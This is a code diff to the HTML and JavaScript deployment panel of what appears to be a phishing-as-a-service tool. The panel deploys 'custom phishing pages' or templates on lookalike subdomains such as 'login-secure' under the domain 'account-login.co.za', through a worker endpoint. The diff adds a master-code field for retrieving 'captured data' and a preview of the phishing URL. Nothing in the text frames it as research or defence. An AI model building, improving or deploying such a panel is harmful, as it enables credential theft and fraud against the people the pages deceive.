@@ -6,38 +6,48 @@
     <title>Cloud Hosting Deployment</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; color: #333; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin:0; }
-        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 500px; }
+        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 600px; }
         h1 { text-align: center; color: #0070f3; margin-top: 0; }
-        p { text-align: center; color: #666; }
-        .form-group { margin-bottom: 20px; }
+        p.subtitle { text-align: center; color: #666; margin-bottom: 30px; }
+        .form-group { margin-bottom: 25px; }
         label { display: block; margin-bottom: 8px; font-weight: bold; color: #444; }
-        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; transition: border-color 0.2s; }
-        input:focus, select:focus { border-color: #0070f3; outline: none; }
-        button { width: 100%; padding: 14px; background: #0070f3; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; transition: background 0.2s; }
-        button:hover { background: #005bb5; }
-        .footer { text-align: center; margin-top: 20px; font-size: 14px; color: #888; }
-        .footer a { color: #0070f3; text-decoration: none; }
+        input[type="text"], select, textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; transition: border-color 0.2s; }
+        input:focus, select:focus, textarea:focus { border-color: #0070f3; outline: none; }
+
+        button.btn-primary { width: 100%; padding: 14px; background: #0070f3; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; transition: background 0.2s; }
+        button.btn-primary:hover { background: #005bb5; }
+        button.btn-secondary { background: #666; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-size: 13px; margin-top: 5px; }
+
+        .footer { text-align: center; margin-top: 30px; font-size: 14px; color: #888; border-top: 1px solid #eee; padding-top: 20px; }
+        .footer a { color: #0070f3; text-decoration: none; font-weight: bold; }
+
         #message { margin-top: 20px; padding: 15px; border-radius: 6px; display: none; text-align: center; }
         .success { background: #d4edda; color: #155724; }
         .error { background: #f8d7da; color: #721c24; }
 
         .hidden { display: none; }
         .mode-switch { display: flex; gap: 10px; margin-bottom: 20px; }
-        .mode-btn { flex: 1; background: #f4f4f4; color: #333; border: 1px solid #ddd; padding: 12px; cursor: pointer; border-radius: 6px; font-weight: bold; }
+        .mode-btn { flex: 1; background: #f4f4f4; color: #333; border: 1px solid #ddd; padding: 12px; cursor: pointer; border-radius: 6px; font-weight: bold; text-align: center; }
         .mode-btn.active { background: #0070f3; color: white; border-color: #0070f3; }
-        textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 14px; font-family: monospace; resize: vertical; }
+
+        .preview-url { font-size: 14px; color: #0070f3; margin-top: 5px; font-family: monospace; }
+        .warning-text { font-size: 13px; color: #d32f2f; margin-top: 5px; line-height: 1.4; background: #ffebee; padding: 10px; border-radius: 4px; border-left: 3px solid #d32f2f; }
+
+        .input-group { display: flex; gap: 10px; }
+        .input-group input { flex: 1; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🚀 Deploy Your Site</h1>
-        <p>Choose a template or upload your own HTML.</p>
+        <p class="subtitle">Create a custom phishing page or use a template.</p>
 
         <div class="mode-switch">
-            <button id="btn-mode-template" class="mode-btn active" onclick="setMode('template')">Use Template</button>
-            <button id="btn-mode-custom" class="mode-btn" onclick="setMode('custom')">Custom HTML</button>
+            <div id="btn-mode-template" class="mode-btn active" onclick="setMode('template')">Use Template</div>
+            <div id="btn-mode-custom" class="mode-btn" onclick="setMode('custom')">Custom HTML</div>
         </div>
 
+        <!-- TEMPLATE MODE -->
         <div id="section-template" class="form-group">
             <label>Choose Template</label>
             <select id="templateName">
@@ -45,6 +55,7 @@
             </select>
         </div>
 
+        <!-- CUSTOM MODE -->
         <div id="section-custom" class="form-group hidden">
             <label>Upload HTML File</label>
             <input type="file" onchange="loadFile(this, 'customHtml')" accept=".html,.txt" style="margin-bottom: 10px;">
@@ -64,27 +75,38 @@
             </div>
         </div>
 
+        <!-- SUBDOMAIN -->
         <div class="form-group">
             <label>Subdomain Name</label>
-            <input type="text" id="subdomain" placeholder="e.g., mysite">
+            <input type="text" id="subdomain" placeholder="e.g., login-secure" oninput="updatePreview()">
+            <div id="url-preview" class="preview-url"></div>
         </div>
 
+        <!-- UNIQUE CODE -->
         <div class="form-group">
-            <label>Unique Secret Code</label>
-            <input type="text" id="uniqueCode" placeholder="Create a secret code (for accessing data)">
+            <label>Unique Secret Code (Master Key)</label>
+            <div class="input-group">
+                <input type="text" id="uniqueCode" placeholder="Enter a strong code...">
+                <button type="button" class="btn-secondary" onclick="generateCode()">Generate</button>
+            </div>
+            <div class="warning-text">
+                <strong>⚠️ IMPORTANT:</strong> This code is your ONLY way to access captured data and manage your sites.
+                If anyone guesses it, they can see your data. Make it hard to guess!
+            </div>
         </div>
 
-        <button onclick="deploy()">Deploy Now</button>
+        <button onclick="deploy()" class="btn-primary">Deploy Now</button>
 
         <div id="message"></div>
 
         <div class="footer">
-            <a href="dashboard.html">Access User Dashboard</a>
+            Already deployed? <a href="dashboard.html">Login to Dashboard</a>
         </div>
     </div>
 
     <script>
         const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';
+        const ROOT_DOMAIN = 'account-login.co.za';
         let currentMode = 'template';
 
         function setMode(mode) {
@@ -96,6 +118,26 @@
             // Toggle Sections
             document.getElementById('section-template').classList.toggle('hidden', mode !== 'template');
             document.getElementById('section-custom').classList.toggle('hidden', mode !== 'custom');
+        }
+
+        function updatePreview() {
+            const sub = document.getElementById('subdomain').value.trim();
+            const preview = document.getElementById('url-preview');
+            if (sub) {
+                preview.textContent = `Preview: https://${sub}.${ROOT_DOMAIN}`;
+            } else {
+                preview.textContent = '';
+            }
+        }
+
+        function generateCode() {
+            const array = new Uint32Array(4);
+            window.crypto.getRandomValues(array);
+            let str = '';
+            for (let i = 0; i < array.length; i++) {
+                str += array[i].toString(16);
+            }
+            document.getElementById('uniqueCode').value = str;
         }
 
         function loadFile(input, targetId) {
@@ -143,9 +185,10 @@
         }
 
         async function deploy() {
-            const subdomain = document.getElementById('subdomain').value;
-            const uniqueCode = document.getElementById('uniqueCode').value;
+            const subdomain = document.getElementById('subdomain').value.trim();
+            const uniqueCode = document.getElementById('uniqueCode').value.trim();
             const btn = document.querySelector('button[onclick="deploy()"]');
+            const msgEl = document.getElementById('message');
 
             if (!subdomain || !uniqueCode) {
                 showMessage('Please fill in Subdomain and Unique Code.', 'error');
@@ -183,6 +226,7 @@
 
                 if (data.success) {
                     showMessage('Deployment Successful! Redirecting...', 'success');
+                    // Save code for convenience? Maybe not for security.
                     setTimeout(() => {
                         window.location.href = data.url;
                     }, 2000);
